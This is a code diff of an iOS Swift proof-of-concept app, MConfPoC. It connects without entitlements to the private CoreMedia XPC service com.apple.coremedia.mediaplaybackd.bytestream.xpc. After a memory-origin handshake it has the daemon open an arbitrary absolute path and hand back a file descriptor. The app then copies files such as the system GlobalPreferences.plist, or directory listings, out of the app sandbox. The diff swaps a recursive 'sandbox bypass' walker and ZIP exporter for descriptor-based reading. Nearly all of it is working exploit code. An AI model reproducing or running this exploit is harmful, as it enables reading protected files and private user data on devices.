@@ -2,7 +2,7 @@
 //  ContentView.swift
 //  MConfPoC
 //
-//  CoreMedia bytestream PoC with Resilient POSIX Directory Traversal & ZIP Export.
+//  CoreMedia bytestream PoC.
 //  Runs only on explicit Run-button press. The target path is supplied in the UI.
 //  Results and short execution messages are saved inside Documents/.
 //
@@ -27,6 +27,7 @@ private func resetSessionLogFile() {
 private func openLog() {
     if logFd >= 0 { close(logFd); logFd = -1 }
     let path = docs.appendingPathComponent("run.log").path
+    // Keep all runs from the current app session in the same log file.
     logFd = open(path, O_WRONLY | O_CREAT | O_APPEND, 0o644)
 }
 
@@ -35,164 +36,32 @@ private final class EHBox {
     var seen = false
 }
 
+/// Releases the +1 CoreFoundation-style reference returned by a Fig *Create/Complete API.
 private func releaseFigReference(_ pointer: UnsafeMutableRawPointer?) {
     guard let pointer else { return }
     Unmanaged<CFTypeRef>.fromOpaque(pointer).release()
 }
 
-// MARK: - Simple In-Memory ZIP Creator (Store Method)
-
-private struct ZipWriter {
-    private var data = Data()
-    private var directoryRecords = Data()
-    private var fileCount: UInt16 = 0
-
-    mutating func addFile(relativePath: String, fileData: Data) {
-        let pathBytes = Array(relativePath.utf8)
-        let pathLength = UInt16(pathBytes.count)
-        let fileOffset = UInt32(data.count)
-        let crc = crc32(fileData)
-        let fileSize = UInt32(fileData.count)
-
-        // Local File Header
-        var header = Data()
-        header.append(contentsOf: [0x50, 0x4b, 0x03, 0x04]) // Signature
-        header.append(contentsOf: [0x14, 0x00])             // Version needed (2.0)
-        header.append(contentsOf: [0x00, 0x00])             // General flag
-        header.append(contentsOf: [0x00, 0x00])             // Compression: 0 (Store)
-        header.append(contentsOf: [0x00, 0x00, 0x00, 0x00]) // Mod time/date
-        header.append(withUnsafeBytes(of: crc) { Data($0) })
-        header.append(withUnsafeBytes(of: fileSize) { Data($0) })
-        header.append(withUnsafeBytes(of: fileSize) { Data($0) })
-        header.append(withUnsafeBytes(of: pathLength) { Data($0) })
-        header.append(contentsOf: [0x00, 0x00])             // Extra field length
-        header.append(contentsOf: pathBytes)
-
-        data.append(header)
-        data.append(fileData)
-
-        // Central Directory Structure
-        var cdRecord = Data()
-        cdRecord.append(contentsOf: [0x50, 0x4b, 0x01, 0x02]) // Signature
-        cdRecord.append(contentsOf: [0x14, 0x00])             // Version made by
-        cdRecord.append(contentsOf: [0x14, 0x00])             // Version needed
-        cdRecord.append(contentsOf: [0x00, 0x00])             // General flag
-        cdRecord.append(contentsOf: [0x00, 0x00])             // Compression: 0
-        cdRecord.append(contentsOf: [0x00, 0x00, 0x00, 0x00]) // Mod time/date
-        cdRecord.append(withUnsafeBytes(of: crc) { Data($0) })
-        cdRecord.append(withUnsafeBytes(of: fileSize) { Data($0) })
-        cdRecord.append(withUnsafeBytes(of: fileSize) { Data($0) })
-        cdRecord.append(withUnsafeBytes(of: pathLength) { Data($0) })
-        cdRecord.append(contentsOf: [0x00, 0x00])             // Extra field length
-        cdRecord.append(contentsOf: [0x00, 0x00])             // Comment length
-        cdRecord.append(contentsOf: [0x00, 0x00])             // Disk number start
-        cdRecord.append(contentsOf: [0x00, 0x00])             // Internal file attributes
-        cdRecord.append(contentsOf: [0x00, 0x00, 0x00, 0x00]) // External file attributes
-        cdRecord.append(withUnsafeBytes(of: fileOffset) { Data($0) })
-        cdRecord.append(contentsOf: pathBytes)
-
-        directoryRecords.append(cdRecord)
-        fileCount += 1
-    }
-
-    mutating func finalize() -> Data {
-        let cdOffset = UInt32(data.count)
-        let cdSize = UInt32(directoryRecords.count)
-
-        data.append(directoryRecords)
-
-        // End of Central Directory Record (EOCD)
-        var eocd = Data()
-        eocd.append(contentsOf: [0x50, 0x4b, 0x05, 0x06])     // Signature
-        eocd.append(contentsOf: [0x00, 0x00])                 // Disk number
-        eocd.append(contentsOf: [0x00, 0x00])                 // Disk with CD
-        eocd.append(withUnsafeBytes(of: fileCount) { Data($0) }) // CD entries on disk
-        eocd.append(withUnsafeBytes(of: fileCount) { Data($0) }) // Total CD entries
-        eocd.append(withUnsafeBytes(of: cdSize) { Data($0) })
-        eocd.append(withUnsafeBytes(of: cdOffset) { Data($0) })
-        eocd.append(contentsOf: [0x00, 0x00])                 // Comment length
-
-        data.append(eocd)
-        return data
-    }
-
-    private func crc32(_ data: Data) -> UInt32 {
-        var crc: UInt32 = 0xffffffff
-        for byte in data {
-            let index = Int((crc ^ UInt32(byte)) & 0xff)
-            crc = (crc >> 8) ^ ZipWriter.crc32Table[index]
-        }
-        return crc ^ 0xffffffff
-    }
-
-    private static let crc32Table: [UInt32] = {
-        (0...255).map { i -> UInt32 in
-            var c = UInt32(i)
-            for _ in 0..<8 {
-                if (c & 1) != 0 {
-                    c = 0xedb88320 ^ (c >> 1)
-                } else {
-                    c = c >> 1
-                }
-            }
-            return c
-        }
-    }()
-}
-
-// MARK: - POSIX Directory Traversal (Sandbox Bypass for Listing)
-
-private func listDirectoryRecursivePOSIX(path: String) -> [String] {
-    var results: [String] = []
-    
-    func scan(currentPath: String, relativeTo root: String) {
-        guard let dir = opendir(currentPath) else { return }
-        defer { closedir(dir) }
-        
-        while let entry = readdir(dir) {
-            let nameC = withUnsafePointer(to: entry.pointee.d_name) {
-                $0.withMemoryRebound(to: CChar.self, capacity: Int(NAME_MAX)) {
-                    String(cString: $0)
-                }
-            }
-            
-            if nameC == "." || nameC == ".." { continue }
-            
-            let fullPath = (currentPath as NSString).appendingPathComponent(nameC)
-            let rootNormalized = (root as NSString).standardizingPath
-            let fullNormalized = (fullPath as NSString).standardizingPath
-            
-            let relPath: String
-            if fullNormalized.hasPrefix(rootNormalized + "/") {
-                let idx = fullNormalized.index(rootNormalized.startIndex, offsetBy: rootNormalized.count + 1)
-                relPath = String(fullNormalized[idx...])
-            } else {
-                relPath = nameC
-            }
-            
-            var st = stat()
-            if lstat(fullPath, &st) == 0 {
-                if (st.st_mode & S_IFMT) == S_IFDIR {
-                    scan(currentPath: fullPath, relativeTo: root)
-                } else if (st.st_mode & S_IFMT) == S_IFREG {
-                    results.append(relPath)
-                }
-            }
-        }
-    }
-    
-    scan(currentPath: path, relativeTo: path)
-    return results
-}
-
-// MARK: - Helper Types & Utilities
+// MARK: - ContentView
 
 private let legacyTargetPath = "/private/var/mobile/Library/Preferences/.GlobalPreferences.plist"
 
+/// Builds a safe local output filename without restricting the requested input path.
 private func outputFilename(for targetPath: String) -> String {
     let name = URL(fileURLWithPath: targetPath).lastPathComponent
     let safeName = name.isEmpty || name == "/" ? "target.bin" : name
-    return "Recovered-" + safeName
+    return safeName
+}
+
+private func recoveredFileURL(for targetPath: String) -> URL {
+    let filename = targetPath == legacyTargetPath
+        ? "GlobalPreferences.plist"
+        : outputFilename(for: targetPath)
+    return docs.appendingPathComponent(filename)
+}
+
+private func recoveredDirectoryURL(for targetPath: String) -> URL {
+    docs.appendingPathComponent(outputFilename(for: targetPath) + ".directory.txt")
 }
 
 private struct ActivityView: UIViewControllerRepresentable {
@@ -204,8 +73,6 @@ private struct ActivityView: UIViewControllerRepresentable {
 
     func updateUIViewController(_ controller: UIActivityViewController, context: Context) {}
 }
-
-// MARK: - ContentView
 
 struct ContentView: View {
     @State private var status = "Ready"
@@ -234,7 +101,7 @@ struct ContentView: View {
                     Text("Target path")
                         .font(.footnote)
                         .foregroundStyle(.secondary)
-                    TextField("Enter file or directory path", text: $targetPath)
+                    TextField("Enter target path", text: $targetPath)
                         .font(.system(.body, design: .monospaced))
                         .textInputAutocapitalization(.never)
                         .autocorrectionDisabled()
@@ -254,13 +121,20 @@ struct ContentView: View {
                     if !logs.isEmpty {
                         logs.append("──────── New run ────────")
                     }
-                    let requestedPath = targetPath.trimmingCharacters(in: .whitespacesAndNewlines)
+                    let requestedPath = targetPath
+                    let trimmedPath = requestedPath.trimmingCharacters(in: .whitespacesAndNewlines)
+                    let expectedResultURL = recoveredFileURL(for: trimmedPath)
+                    let expectedDirectoryURL = recoveredDirectoryURL(for: trimmedPath)
                     DispatchQueue.global(qos: .userInitiated).async {
-                        runChain(targetPath: requestedPath) { line, savedURL in
+                        runChain(targetPath: requestedPath) { line in
                             DispatchQueue.main.async {
                                 logs.append(line)
-                                if let savedURL = savedURL {
-                                    resultURL = savedURL
+                                if line.hasPrefix("Saved directory listing "),
+                                   FileManager.default.fileExists(atPath: expectedDirectoryURL.path) {
+                                    resultURL = expectedDirectoryURL
+                                } else if line.hasPrefix("Saved "),
+                                          FileManager.default.fileExists(atPath: expectedResultURL.path) {
+                                    resultURL = expectedResultURL
                                 }
                             }
                         }
@@ -270,12 +144,14 @@ struct ContentView: View {
                         }
                     }
                 } label: {
-                    Text(isRunning ? "Running…" : "Run")
-                        .font(.system(size: 18, weight: .medium))
-                        .foregroundStyle(.white)
-                        .frame(maxWidth: .infinity)
-                        .frame(height: 58)
-                        .contentShape(panelShape)
+                    ZStack {
+                        Text("Run")
+                            .font(.system(size: 18, weight: .medium))
+                            .foregroundStyle(.white)
+                    }
+                    .frame(maxWidth: .infinity)
+                    .frame(height: 58)
+                    .contentShape(panelShape)
                 }
                 .buttonStyle(.plain)
                 .background(Color(uiColor: .systemBlue), in: panelShape)
@@ -355,28 +231,29 @@ struct ContentView: View {
     }
 }
 
-// MARK: - The Chain & Core Processing
+// MARK: - The chain
 
-private func runChain(targetPath requestedPath: String, onLog: @escaping (String, URL?) -> Void) {
+private func runChain(targetPath requestedPath: String, onLog: @escaping (String) -> Void) {
     openLog()
     defer { if logFd >= 0 { close(logFd); logFd = -1 } }
-    
-    func logLine(_ message: String, resultURL: URL? = nil) {
+    func logLine(_ message: String) {
         let line = message + "\n"
         if logFd >= 0 { _ = line.withCString { write(logFd, $0, strlen($0)) } }
-        onLog(message, resultURL)
+        onLog(message)
     }
-
     logLine("Run started")
     let dev = UIDevice.current
     logLine("Device: \(dev.model), iOS \(dev.systemVersion)")
 
     let targetPath = requestedPath.trimmingCharacters(in: .whitespacesAndNewlines)
     guard !targetPath.isEmpty, targetPath.hasPrefix("/") else {
-        logLine("Invalid target: enter an absolute path")
+        logLine("Invalid target: enter an absolute file or directory path")
         logLine("Run finished")
         return
     }
+    let outputName = targetPath == legacyTargetPath
+        ? "GlobalPreferences.plist"
+        : outputFilename(for: targetPath)
     logLine("Target: \(targetPath)")
 
     // Step 1 — resolve symbols.
@@ -398,7 +275,9 @@ private func runChain(targetPath requestedPath: String, onLog: @escaping (String
           let pU64 = dlsym(rtld, "xpc_dictionary_get_uint64"),
           let pSetU64 = dlsym(rtld, "xpc_dictionary_set_uint64"),
           let pDupFd = dlsym(rtld, "xpc_dictionary_dup_fd"),
+          let pGetData = dlsym(rtld, "xpc_dictionary_get_data"),
           let pI64 = dlsym(rtld, "xpc_dictionary_get_int64"),
+          let pSetI64 = dlsym(rtld, "xpc_dictionary_set_int64"),
           let pDesc = dlsym(rtld, "xpc_copy_description"),
           let pType = dlsym(rtld, "xpc_get_type"),
           let pTypeName = dlsym(rtld, "xpc_type_get_name"),
@@ -421,7 +300,9 @@ private func runChain(targetPath requestedPath: String, onLog: @escaping (String
     typealias FU64 = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> UInt64
     typealias FSetU64 = @convention(c) (OpaquePointer?, UnsafePointer<CChar>, UInt64) -> Void
     typealias FDupFd = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> Int32
+    typealias FGetData = @convention(c) (OpaquePointer?, UnsafePointer<CChar>, UnsafeMutablePointer<Int>?) -> UnsafeRawPointer?
     typealias FI64 = @convention(c) (OpaquePointer?, UnsafePointer<CChar>) -> Int64
+    typealias FSetI64 = @convention(c) (OpaquePointer?, UnsafePointer<CChar>, Int64) -> Void
     typealias FDesc = @convention(c) (OpaquePointer?) -> UnsafeMutablePointer<CChar>?
     typealias FType = @convention(c) (OpaquePointer?) -> OpaquePointer?
     typealias FTypeName = @convention(c) (OpaquePointer?) -> UnsafePointer<CChar>?
@@ -442,7 +323,9 @@ private func runChain(targetPath requestedPath: String, onLog: @escaping (String
     let fU64 = unsafeBitCast(pU64, to: FU64.self)
     let fSetU64 = unsafeBitCast(pSetU64, to: FSetU64.self)
     let fDupFd = unsafeBitCast(pDupFd, to: FDupFd.self)
+    let fGetData = unsafeBitCast(pGetData, to: FGetData.self)
     let fI64 = unsafeBitCast(pI64, to: FI64.self)
+    let fSetI64 = unsafeBitCast(pSetI64, to: FSetI64.self)
     let fDesc = unsafeBitCast(pDesc, to: FDesc.self)
     let fType = unsafeBitCast(pType, to: FType.self)
     let fTypeName = unsafeBitCast(pTypeName, to: FTypeName.self)
@@ -459,7 +342,7 @@ private func runChain(targetPath requestedPath: String, onLog: @escaping (String
         return String(cString: n)
     }
 
-    // Step 2 — connect.
+    // Step 2 — connect (no entitlement required).
     guard let conn = "com.apple.coremedia.mediaplaybackd.bytestream.xpc".withCString({ fConnCreate($0, nil, 0) }) else {
         logLine("XPC connection failed"); return
     }
@@ -472,6 +355,10 @@ private func runChain(targetPath requestedPath: String, onLog: @escaping (String
     fSetEH(conn, eh as AnyObject)
     fResume(conn)
     logLine("XPC connected")
+
+    // Each Run owns one XPC session. Leaving it active makes the next Run's
+    // memory-origin handshake collide with the still-live previous session.
+    // Cancel first, then release the xpc_connection_t after all requests finish.
 
     func send(_ m: UnsafeMutableRawPointer?) -> (OpaquePointer?, String) {
         guard let m = m else { return (nil, "nil") }
@@ -492,14 +379,17 @@ private func runChain(targetPath requestedPath: String, onLog: @escaping (String
         return (out, tn)
     }
 
-    // Step 3 — handshake.
+    // Step 3 — memory-origin handshake.
+    // Both Fig APIs below follow Create-rule ownership: keep their +1 refs alive
+    // for the stream lifetime, then release them before cancelling the XPC session.
     var memoryRecipient: UnsafeMutableRawPointer? = nil
     var memoryOrigin: UnsafeMutableRawPointer? = nil
+
     var rp2Ready = false
     var handshakeReady = false
 
     var rp1Msg: UnsafeMutableRawPointer? = nil
-    if fBasic(0x2e727031, 0, &rp1Msg) == 0, let m1 = rp1Msg {
+    if fBasic(0x2e727031, 0, &rp1Msg) == 0, let m1 = rp1Msg {           // '.rp1'
         let (r1, t1) = send(m1)
         let replyDetail = (t1 == "error") ? " — \(desc(r1))" : ""
         logLine("Handshake 1: \(t1)\(replyDetail)")
@@ -507,9 +397,9 @@ private func runChain(targetPath requestedPath: String, onLog: @escaping (String
 
         if let r1 = r1, t1 == "dictionary" {
             var rp2Msg: UnsafeMutableRawPointer? = nil
-            if fBasic(0x2e727032, 0, &rp2Msg) == 0, let m2 = rp2Msg {
+            if fBasic(0x2e727032, 0, &rp2Msg) == 0, let m2 = rp2Msg {   // '.rp2'
                 let cr = "mconf".withCString { fRecip(r1, m2, $0, &memoryRecipient) }
-                logLine("Recipient creation: status=\(cr)")
+                logLine("Recipient creation: status=\(cr), object=\(memoryRecipient == nil ? "nil" : "present")")
 
                 if cr == 0, memoryRecipient != nil {
                     let (r2, t2) = send(m2)
@@ -517,16 +407,22 @@ private func runChain(targetPath requestedPath: String, onLog: @escaping (String
                     logLine("Handshake 2: \(t2)\(replyDetail2)")
                     rp2Ready = (t2 == "dictionary" && r2 != nil)
                     if let r2 = r2 { fRel(r2) }
+                } else {
+                    logLine("Handshake 2 skipped: memory recipient was not created")
                 }
                 fRel(OpaquePointer(m2))
+            } else {
+                logLine("Handshake 2 message creation failed")
             }
             fRel(r1)
         }
+    } else {
+        logLine("Handshake 1 message creation failed")
     }
 
     if rp2Ready {
         var orgMsg: UnsafeMutableRawPointer? = nil
-        if fBasic(0x2e6f7267, 0, &orgMsg) == 0, let om = orgMsg {
+        if fBasic(0x2e6f7267, 0, &orgMsg) == 0, let om = orgMsg {       // '.org'
             let bg = fBegin(om)
             logLine("Origin begin: status=\(bg)")
             if bg == 0 {
@@ -538,49 +434,207 @@ private func runChain(targetPath requestedPath: String, onLog: @escaping (String
                         let cp = fComp(or, &memoryOrigin)
                         handshakeReady = (cp == 0 && memoryOrigin != nil)
                         logLine("Origin established: \(handshakeReady ? "yes" : "no (status=\(cp))")")
+                    } else {
+                        logLine("Origin response was not a dictionary")
                     }
                     fRel(or)
                 }
+            } else {
+                logLine("Origin begin failed; .org request skipped")
             }
             fRel(OpaquePointer(om))
+        } else {
+            logLine("Origin message creation failed")
+        }
+    } else {
+        logLine("Origin handshake skipped: .rp1/.rp2 did not complete")
+    }
+
+    // Render the entries already present in a directory FD directly in Run Log.
+    func directoryEntryName(_ entry: UnsafeMutablePointer<dirent>) -> String {
+        let capacity = MemoryLayout.size(ofValue: entry.pointee.d_name)
+        return withUnsafePointer(to: &entry.pointee.d_name) { namePointer in
+            namePointer.withMemoryRebound(to: CChar.self, capacity: capacity) {
+                String(cString: $0)
+            }
         }
     }
 
-    // Safely attempts to fetch raw file data via CoreMedia. Non-throwing, returns nil on failure.
-    func fetchFileData(at path: String) -> Data? {
+    func describeEntryType(_ mode: mode_t) -> String {
+        switch mode & mode_t(S_IFMT) {
+        case mode_t(S_IFDIR): return "DIR"
+        case mode_t(S_IFREG): return "FILE"
+        case mode_t(S_IFLNK): return "SYMLINK"
+        case mode_t(S_IFCHR): return "CHAR"
+        case mode_t(S_IFBLK): return "BLOCK"
+        case mode_t(S_IFIFO): return "FIFO"
+        case mode_t(S_IFSOCK): return "SOCKET"
+        default: return "OTHER"
+        }
+    }
+
+    func escapedEntryName(_ name: String) -> String {
+        name.replacingOccurrences(of: "\\", with: "\\\\")
+            .replacingOccurrences(of: "\t", with: "\\t")
+            .replacingOccurrences(of: "\n", with: "\\n")
+            .replacingOccurrences(of: "\r", with: "\\r")
+    }
+
+    func saveDirectoryListing(fd: Int32, outputName: String) {
+        guard let directory = fdopendir(fd) else {
+            let savedErrno = errno
+            close(fd)
+            logLine("Directory stream creation failed: errno=\(savedErrno)")
+            return
+        }
+        defer { closedir(directory) }
+
+        let directoryFD = dirfd(directory)
+        var entries: [(name: String, type: String?, size: Int64?)] = []
+        let maximumEntries = 10_000
+        var reachedLimit = false
+        var readError: Int32 = 0
+
+        while true {
+            errno = 0
+            guard let entry = readdir(directory) else {
+                readError = errno
+                break
+            }
+            let name = directoryEntryName(entry)
+            if name == "." || name == ".." { continue }
+            if entries.count >= maximumEntries {
+                reachedLimit = true
+                break
+            }
+
+            var itemStat = stat()
+            let statResult = name.withCString {
+                fstatat(directoryFD, $0, &itemStat, AT_SYMLINK_NOFOLLOW)
+            }
+            if statResult == 0 {
+                entries.append((name, describeEntryType(itemStat.st_mode), Int64(itemStat.st_size)))
+            } else {
+                // When metadata is unavailable, show the entry name without UNKNOWN or ? placeholders.
+                entries.append((name, nil, nil))
+            }
+        }
+
+        entries.sort { $0.name.localizedStandardCompare($1.name) == .orderedAscending }
+        logLine("Directory entries (\(entries.count)):")
+        var manifestLines = ["Type\tSize\tName"]
+        for entry in entries {
+            let safeName = escapedEntryName(entry.name)
+            let renderedLine: String
+            if let type = entry.type, let size = entry.size {
+                renderedLine = "\(type)\t\(size)\t\(safeName)"
+            } else {
+                renderedLine = safeName
+            }
+            manifestLines.append(renderedLine)
+            logLine(renderedLine)
+        }
+        if reachedLimit {
+            manifestLines.append("TRUNCATED\t-\tEntry limit: \(maximumEntries)")
+            logLine("Directory listing truncated at \(maximumEntries) entries")
+        }
+        if readError != 0 {
+            manifestLines.append("READ_ERROR\t-\terrno=\(readError)")
+            logLine("Directory enumeration ended with errno=\(readError)")
+        }
+
+        let output = docs.appendingPathComponent(outputName)
+        do {
+            try (manifestLines.joined(separator: "\n") + "\n").write(
+                to: output,
+                atomically: true,
+                encoding: .utf8
+            )
+            logLine("Saved directory listing \(entries.count) entries: \(outputName)")
+        } catch {
+            logLine("Directory listing save failed: \(error.localizedDescription)")
+        }
+    }
+
+    // Save an ordinary file byte-for-byte, or show a directory's immediate entries.
+    func takeFd(_ outputName: String, directoryOutputName: String, fd: Int32) {
+        var st = stat()
+        guard fstat(fd, &st) == 0 else {
+            let savedErrno = errno
+            close(fd)
+            logLine("File descriptor check failed: errno=\(savedErrno)")
+            return
+        }
+
+        let fileType = st.st_mode & mode_t(S_IFMT)
+        if fileType == mode_t(S_IFDIR) {
+            logLine("Target is a directory; listing entries")
+            saveDirectoryListing(fd: fd, outputName: directoryOutputName)
+            return
+        }
+
+        guard fileType == mode_t(S_IFREG) else {
+            close(fd)
+            logLine("Target is neither a regular file nor a directory")
+            return
+        }
+
+        defer { close(fd) }
+        let size = Int64(st.st_size)
+        guard size > 0 else {
+            logLine("Unexpected file size: \(size)")
+            return
+        }
+        guard size <= Int64(Int.max) else {
+            logLine("File is too large to read into memory: \(size) bytes")
+            return
+        }
+        var buffer = [UInt8](repeating: 0, count: Int(size))
+        let count = pread(fd, &buffer, buffer.count, 0)
+        guard count > 0 else {
+            logLine("File read failed: errno=\(errno)")
+            return
+        }
+        let output = docs.appendingPathComponent(outputName)
+        do {
+            try Data(buffer.prefix(count)).write(to: output, options: .atomic)
+            logLine("Saved \(count) bytes: \(outputName)")
+        } catch {
+            logLine("Save failed: \(error.localizedDescription)")
+        }
+    }
+
+    // 'Curl' probe: let the daemon open `path` and hand back the fd.
+    func probe(_ path: String, outputName: String, directoryOutputName: String) {
         let cfURL = URL(fileURLWithPath: path) as CFURL
         var msg: UnsafeMutableRawPointer? = nil
-        guard fBasic(0x4375726c, 0, &msg) == 0, let m = msg else { return nil }
-        
+        guard fBasic(0x4375726c, 0, &msg) == 0, let m = msg else {       // 'Curl'
+            logLine("Request message failed"); return
+        }
         _ = fSetURL(m, "CreationURL", Unmanaged.passUnretained(cfURL).toOpaque())
         fSetU64(OpaquePointer(m), "FileOpenOptions", 0)
         let (rp, rt) = send(m)
         fRel(OpaquePointer(m))
-        
-        guard rt == "dictionary", let rp = rp else { return nil }
+        guard rt == "dictionary", let rp = rp else {
+            logLine("Request failed: \(rt)"); if let rp = rp { fRel(rp) }; return
+        }
         guard let details = fVal(rp, "ByteStreamDetails") else {
-            fRel(rp); return nil
+            let err = fI64(rp, ".ErrorReturn")
+            logLine("Access denied (\(err))")
+            fRel(rp); return
         }
         let oid = fU64(details, "ObjectID")
+        logLine("Stream opened")
         let fd = fDupFd(details, "FileDescriptor")
-        
-        var readData: Data? = nil
         if fd >= 0 {
-            defer { close(fd) }
-            var st = stat()
-            if fstat(fd, &st) == 0, (st.st_mode & 0o170000) == 0o100000 {
-                let size = Int(st.st_size)
-                if size > 0 {
-                    var buffer = [UInt8](repeating: 0, count: size)
-                    let count = pread(fd, &buffer, buffer.count, 0)
-                    if count > 0 {
-                        readData = Data(buffer.prefix(count))
-                    }
-                }
-            }
+            logLine("File descriptor received")
+            takeFd(outputName, directoryOutputName: directoryOutputName, fd: fd)
+        } else {
+            logLine("No file descriptor returned")
         }
-        
-        // Close stream on daemon
+
+
+        // close the stream server-side
         var mD: UnsafeMutableRawPointer? = nil
         if fBasic(0x646f6f6d, oid, &mD) == 0, let mD = mD {
             let (rd, _) = send(mD)
@@ -588,73 +642,17 @@ private func runChain(targetPath requestedPath: String, onLog: @escaping (String
             fRel(OpaquePointer(mD))
         }
         fRel(rp)
-        return readData
     }
 
-    // Step 4 — Main processing (Directory vs Single File)
     if handshakeReady {
-        var isDir: ObjCBool = false
-        let fm = FileManager.default
-        
-        // Проверяем, является ли целевой путь директорией
-        let targetExists = fm.fileExists(atPath: targetPath, isDirectory: &isDir)
-        
-        if targetExists, isDir.boolValue {
-            // --- DIRECTORY MODE ---
-            logLine("Target is a directory. Enumerating via POSIX fallback...")
-            
-            let subpaths = listDirectoryRecursivePOSIX(path: targetPath)
-            logLine("Found \(subpaths.count) items in directory")
-            
-            var zip = ZipWriter()
-            var readSuccessCount = 0
-            var readErrorCount = 0
-            
-            for relPath in subpaths {
-                let fullPath = (targetPath as NSString).appendingPathComponent(relPath)
-                logLine("Reading: \(relPath)")
-                
-                if let fileData = fetchFileData(at: fullPath) {
-                    zip.addFile(relativePath: relPath, fileData: fileData)
-                    readSuccessCount += 1
-                } else {
-                    logLine("Skipped (read failed): \(relPath)")
-                    readErrorCount += 1
-                }
-            }
-            
-            let zipData = zip.finalize()
-            let targetName = URL(fileURLWithPath: targetPath).lastPathComponent
-            let archiveName = "RecoveredFolder-\(targetName.isEmpty ? "Directory" : targetName).zip"
-            let outputURL = docs.appendingPathComponent(archiveName)
-            
-            do {
-                try zipData.write(to: outputURL, options: .atomic)
-                logLine("Saved ZIP archive (\(readSuccessCount) files read, \(readErrorCount) skipped, \(zipData.count) bytes): \(archiveName)", resultURL: outputURL)
-            } catch {
-                logLine("Failed to save ZIP: \(error.localizedDescription)")
-            }
-            
-        } else {
-            // --- SINGLE FILE MODE ---
-            let outputName = targetPath == legacyTargetPath ? "GlobalPreferences.plist" : outputFilename(for: targetPath)
-            if let data = fetchFileData(at: targetPath) {
-                let outputURL = docs.appendingPathComponent(outputName)
-                do {
-                    try data.write(to: outputURL, options: .atomic)
-                    logLine("Saved \(data.count) bytes: \(outputName)", resultURL: outputURL)
-                } catch {
-                    logLine("Save failed: \(error.localizedDescription)")
-                }
-            } else {
-                logLine("Failed to read target file")
-            }
-        }
+        let directoryOutputName = outputFilename(for: targetPath) + ".directory.txt"
+        probe(targetPath, outputName: outputName, directoryOutputName: directoryOutputName)
     } else {
         logLine("Read skipped: memory-origin handshake was not established")
     }
 
-    // Cleanup
+    // Drop Fig-side state before closing the XPC transport. This prevents one
+    // completed Run from leaving an origin/recipient attached to this process.
     releaseFigReference(memoryOrigin)
     memoryOrigin = nil
     releaseFigReference(memoryRecipient)
